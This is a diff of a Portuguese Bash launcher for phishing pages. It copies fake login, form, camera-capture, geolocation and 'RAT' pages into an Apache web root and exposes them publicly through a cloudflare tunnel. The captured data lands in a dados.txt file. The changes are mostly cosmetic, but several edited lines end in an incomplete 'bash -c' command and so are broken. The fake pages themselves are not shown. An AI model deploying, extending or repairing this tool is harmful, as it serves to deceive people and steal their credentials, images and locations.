@@ -10,6 +10,9 @@ apache="/var/www/html/page-fake"  # Local do apache
 c="clear" # Limpar
 
 
+
+
+
 ## Criando pastas
 echo "[** criando nova pasta para o modelo **]"
 mkdir $apache
@@ -35,22 +38,22 @@ show_model_menu() {
     echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   3 ------------------------------->> ${GREEN}Formulario${NC}                     ${YELLOW}|${NC}"
-    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   4 ---------------------->> ${GREEN}Formulario + Camera${NC}                     ${YELLOW}|${NC}"
-    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   5 ------------------->> ${GREEN}Formulario + Geolocate${NC}                     ${YELLOW}|${NC}"
-    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   6 --------->> ${GREEN}Formulario + Geolocate  + Camera${NC}                     ${YELLOW}|${NC}"
-    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   7  ->> ${GREEN}Formulario + Geolocate  + Camera + Rats${NC}                     ${YELLOW}|${NC}"
-    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   8 ------------------------------------>> ${GREEN}Login${NC}                     ${YELLOW}|${NC}"
-    echo -e "${YELLOW}+_____________________________________________________________________+${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   9 -------->> ${GREEN}Login +  Geolocate${NC}                                    ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
@@ -80,7 +83,6 @@ show_main_menu() {
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|            ${GREEN}Created by t0xina_Byt3${NC}                                    ${YELLOW}|${NC}"
-    echo -e "${YELLOW}|______________________________________________________________________|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|                 ${GREEN}[**Escolha o tipo de modelo**]${NC}                       ${YELLOW}|${NC}"
@@ -116,8 +118,6 @@ process_main_choice() {
      1)
             echo -e "${GREEN}${NC}" 
             cp "$type_models/1.jpg" "$apache"  
-            
-            
             ;;
         2)
             echo -e "${GREEN}${NC}"
@@ -166,14 +166,14 @@ process_model_choice() {
             echo "[**Exploits Carregados com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
-            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080; exec bash'" &
+            $TERMINAL -- bash -c
 
             ;;
         2)
@@ -194,14 +194,14 @@ process_model_choice() {
             echo "[**Script carregado com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         4)
             echo -e "${GREEN}Você escolheu: Formulario + Camera${NC}"
@@ -210,14 +210,14 @@ process_model_choice() {
             echo "[**Iniciando Apache2**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash  -c
             ;;
         5)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate${NC}"
@@ -225,21 +225,22 @@ process_model_choice() {
             echo "[**Script carregado com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos       
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &  
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         6)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Camera + Rats${NC}"
             cp  "$type_egs/6.php" "$apache"
             cp  "$type_egs/dados.txt"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -247,7 +248,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         7)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Rats${NC}"
@@ -255,7 +256,7 @@ process_model_choice() {
             cp  "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -264,14 +265,14 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         8)
             echo -e "${GREEN}Você escolheu: Login${NC}"
             cp  "$type_egs/8.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -279,7 +280,7 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
 
         9)
@@ -287,7 +288,7 @@ process_model_choice() {
             cp  "$type_egs/9.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -295,14 +296,14 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         10)
             echo -e "${GREEN}Você escolheu: Camera com zoom ${NC}"
             cp  "$type_egs/10.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -310,14 +311,14 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &  
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         11)
             echo -e "${GREEN}Você escolheu: Login + Camera + Location${NC}"
             cp  "$type_egs/11.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -325,44 +326,44 @@ process_model_choice() {
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &   
-            $TERMINAL -e "bash -c 'cat dados.txt'" 
+            $TERMINAL -- bash -c
             ;;
         12)
             echo -e "${GREEN}Você escolheu: Login + Location + Rats${NC}"
             cp  "$type_egs/12.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
+            chmod +x $apache/* #Nivel de permissão de arquivos
             cp  "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Exploits Carregados com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         13)
             echo -e "${GREEN}Você escolheu: Login + Location${NC}"
             cp  "$type_egs/13.php" "$apache"
             cp "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
-            chmod +x $apache/* #Função para dar permissão para os arquivos
+            chmod +x $apache/* #Nivel de permissão de arquivos
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
             $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
             $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
-            $TERMINAL -e "bash -c 'cat dados.txt'"
+            $TERMINAL -- bash -c
             ;;
         0) 
             echo -e "${RED}Saindo...${NC}"
             exit 0
             ;;
         *)
-            echo -e "${RED}Opção inválida! Tente novamente.${NC}"
+            echo -e "${RED}Opção inválida! Tente novamente... ${NC}"
             ;;
     esac
 }
